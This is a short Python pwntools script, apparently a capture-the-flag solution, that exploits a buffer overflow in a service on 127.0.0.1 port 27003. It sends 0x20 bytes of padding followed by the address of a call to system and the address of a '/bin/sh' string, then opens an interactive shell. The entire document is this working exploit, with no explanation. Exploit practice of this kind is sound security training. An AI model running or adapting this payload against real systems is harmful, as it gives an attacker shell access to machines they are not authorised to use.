from pwn import *

# p = process("./pwn")
p = remote("127.0.0.1", 27003)

call_system_addr = 0x80491e7
binsh_addr = 0x804c024

payload = b"a" * 0x20 + p32(call_system_addr) + p32(binsh_addr)
p.send(payload)

p.interactive()
